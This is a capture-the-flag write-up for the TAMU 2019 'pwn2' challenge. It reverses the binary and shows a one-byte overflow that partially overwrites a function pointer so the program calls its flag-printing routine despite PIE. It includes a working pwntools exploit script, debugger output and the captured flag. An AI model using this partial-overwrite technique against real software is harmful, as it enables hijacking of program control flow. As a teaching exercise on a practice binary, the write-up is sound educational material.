# tamu 2019 pwn2

The goal of this challenge is to get the challenge to print the contents of `flag.txt`, not popping a shell.

Let's take a look at the binary:

```
$    file pwn2
pwn2: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c3936da4c051f1ca58585ee8b243bc9c4a37e437, not stripped
$    pwn checksec pwn2
[*] '/Hackery/pod/modules/partial_overwrite/tamu19_pwn2/pwn2'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
$    ./pwn2
Which function would you like to call?
15935728
```

So we can see that we are dealing with a `32` bit binary, with Relro, NX, and PIE. When we run it, it prompts us for input.

## Reversing

When we take a look at the main function in Ghidra, we see this:

```

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(void)

{
  char input [31];
 
  setvbuf(stdout,(char *)0x2,0,0);
  puts("Which function would you like to call?");
  gets(input);
  select_func(input);
  return 0;
}
```

So we can see that it calls `gets` to scan in data into `input` (so we have one buffer overflow bug there). Before returning it passes our input to the `select_func` function:

```

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void select_func(char *param_1)

{
  int cmp;
  char input [30];
  undefined *functionCall;
 
  strncpy(input,param_1,0x1f);
  cmp = strcmp(input,"one");
  functionCall = two;
  if (cmp == 0) {
    functionCall = one;
  }
  (*(code *)functionCall)();
  return;
}
```

So we can see here, it makes an indirect call of the instruction pointer stored in `functionCall`. It is initialized to the function `two`, and if our input starts with `one\x00` it will be changed to the address of the function `one`. The first `0x1f` (`31`) bytes of our input passed in as an argument in copied to the char buffer `input`, which can only hold `30` bytes. This gives us a one byte overflow, which will allow us to overwrite the least significant byte of `functionCall`.

Also one other thing, a bit of the disassembly here is wrong. Specifically where `functionCall` is initialized to be the address of `two`. When we look at the assembly code, we see that it happens before the `strncpy` call:

```
        00010791 8d 83 f5        LEA        EAX,[0xffffe6f5 + EBX]=>two
                 e6 ff ff
        00010797 89 45 f4        MOV        dword ptr [EBP + functionCall],EAX=>two
        0001079a 83 ec 04        SUB        ESP,0x4
        0001079d 6a 1f           PUSH       0x1f
        0001079f ff 75 08        PUSH       dword ptr [EBP + param_1]
        000107a2 8d 45 d6        LEA        EAX=>input,[EBP + -0x2a]
        000107a5 50              PUSH       EAX
        000107a6 e8 a5 fd        CALL       strncpy                                          char * strncpy(char * __dest, ch
                 ff ff
```

Also we can see that if we can call the function `print_flag` at offset `0x6d8`, we get the flag.

```

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void print_flag(void)

{
  FILE *__fp;
  int iVar1;
 
  puts("This function is still under development.");
  __fp = fopen("flag.txt","r");
  while( true ) {
    iVar1 = _IO_getc((_IO_FILE *)__fp);
    if ((char)iVar1 == -1) break;
    putchar((int)(char)iVar1);
  }
  putchar(10);
  return;
}
```

## Exploitation

So we have a one byte overflow for the least significant byte of the function pointer that is called. Let's take a closer look at the address we are calling, and the address of `print_flag`:

```
gef➤  pie b *0x7d4
gef➤  pie run
Stopped due to shared library event (no libraries added or removed)
Which function would you like to call?
1111111111111111111111111111111

Breakpoint 1, 0x565557d4 in select_func ()
[+] base address 0x56555000
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x56555631  →  <register_tm_clones+49> add BYTE PTR [eax], al
$ebx   : 0x56556fb8  →  0x00001ec0
$ecx   : 0x6f      
$edx   : 0xffffd09e  →  "1111111111111111111111111111111VUV"
$esp   : 0xffffd090  →  0x00000000
$ebp   : 0xffffd0c8  →  0xffffd108  →  0x00000000
$esi   : 0xf7fb5000  →  0x001dbd6c
$edi   : 0xf7fb5000  →  0x001dbd6c
$eip   : 0x565557d4  →  <select_func+85> call eax
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd090│+0x0000: 0x00000000     ← $esp
0xffffd094│+0x0004: 0x0000000a
0xffffd098│+0x0008: 0x00000026 ("&"?)
0xffffd09c│+0x000c: 0x3131de24
0xffffd0a0│+0x0010: "11111111111111111111111111111VUV"
0xffffd0a4│+0x0014: "1111111111111111111111111VUV"
0xffffd0a8│+0x0018: "111111111111111111111VUV"
0xffffd0ac│+0x001c: "11111111111111111VUV"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0x565557c3 <select_func+68> adc    BYTE PTR [ebp-0x72f68a40], al
   0x565557c9 <select_func+74> sbb    DWORD PTR [edi+eiz*8+0x4589ffff], 0xfffffff4
   0x565557d1 <select_func+82> mov    eax, DWORD PTR [ebp-0xc]
 → 0x565557d4 <select_func+85> call   eax
   0x565557d6 <select_func+87> nop    
   0x565557d7 <select_func+88> mov    ebx, DWORD PTR [ebp-0x4]
   0x565557da <select_func+91> leave  
   0x565557db <select_func+92> ret    
   0x565557dc <main+0>         lea    ecx, [esp+0x4]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
*0x56555631 (
   [sp + 0x0] = 0x00000000,
   [sp + 0x4] = 0x0000000a,
   [sp + 0x8] = 0x00000026,
   [sp + 0xc] = 0x3131de24
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn2", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x565557d4 → select_func()
[#1] 0x5655583d → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $eax
$1 = 0x56555631
gef➤  p two
$2 = {<text variable, no debug info>} 0x565556ad <two>
gef➤  p print_flag
$3 = {<text variable, no debug info>} 0x565556d8 <print_flag>
gef➤  vmmap
Start      End        Offset     Perm Path
0x56555000 0x56556000 0x00000000 r-x /Hackery/pod/modules/partial_overwrite/tamu19_pwn2/pwn2
0x56556000 0x56557000 0x00000000 r-- /Hackery/pod/modules/partial_overwrite/tamu19_pwn2/pwn2
0x56557000 0x56558000 0x00001000 rw- /Hackery/pod/modules/partial_overwrite/tamu19_pwn2/pwn2
0x56558000 0x5657a000 0x00000000 rw- [heap]
0xf7dd9000 0xf7df6000 0x00000000 r-- /usr/lib/i386-linux-gnu/libc-2.29.so
0xf7df6000 0xf7f46000 0x0001d000 r-x /usr/lib/i386-linux-gnu/libc-2.29.so
0xf7f46000 0xf7fb2000 0x0016d000 r-- /usr/lib/i386-linux-gnu/libc-2.29.so
0xf7fb2000 0xf7fb3000 0x001d9000 --- /usr/lib/i386-linux-gnu/libc-2.29.so
0xf7fb3000 0xf7fb5000 0x001d9000 r-- /usr/lib/i386-linux-gnu/libc-2.29.so
0xf7fb5000 0xf7fb7000 0x001db000 rw- /usr/lib/i386-linux-gnu/libc-2.29.so
0xf7fb7000 0xf7fb9000 0x00000000 rw-
0xf7fce000 0xf7fd0000 0x00000000 rw-
0xf7fd0000 0xf7fd3000 0x00000000 r-- [vvar]
0xf7fd3000 0xf7fd4000 0x00000000 r-x [vdso]
0xf7fd4000 0xf7fd5000 0x00000000 r-- /usr/lib/i386-linux-gnu/ld-2.29.so
0xf7fd5000 0xf7ff1000 0x00001000 r-x /usr/lib/i386-linux-gnu/ld-2.29.so
0xf7ff1000 0xf7ffb000 0x0001d000 r-- /usr/lib/i386-linux-gnu/ld-2.29.so
0xf7ffc000 0xf7ffd000 0x00027000 r-- /usr/lib/i386-linux-gnu/ld-2.29.so
0xf7ffd000 0xf7ffe000 0x00028000 rw- /usr/lib/i386-linux-gnu/ld-2.29.so
0xfffdd000 0xffffe000 0x00000000 rw- [stack]
```

So we can see that we were able to overwrite the least significant byte with `0x31`. The address that it is initialized to is `0x565556ad`, and the address we want to set it to is `0x565556d8` (for `print_flag`). The difference between these two is just the least significant byte. So we can just overwrite the least significant byte to be `0xd8`, and that will call `print_flag`. We can see that the PIE base is `0x56555000`, and since the least significant byte of the base is `0x00` PIE's randomization doesn't apply to the least significant byte (since `0x00` plus the least significant byte of the PIE offset is whatever the least significant byte of the offset is).

## Exploit

Putting it all together, we have the following exploit:

```
from pwn import *

# Declare the target
target = process('./pwn2')
#gdb.attach(target, gdbscript='pie b *0x7bc')

# Make and send the payload
payload = "0"*0x1e + "\xd8"
target.sendline(payload)

target.interactive()
```

When we run it:

```
$    python exploit.py
[+] Starting local process './pwn2': pid 11453
[*] Switching to interactive mode
Which function would you like to call?
This function is still under development.
flag{g0ttem_b0yz}

[*] Got EOF while reading in interactive
```

Just like that, we got the flag!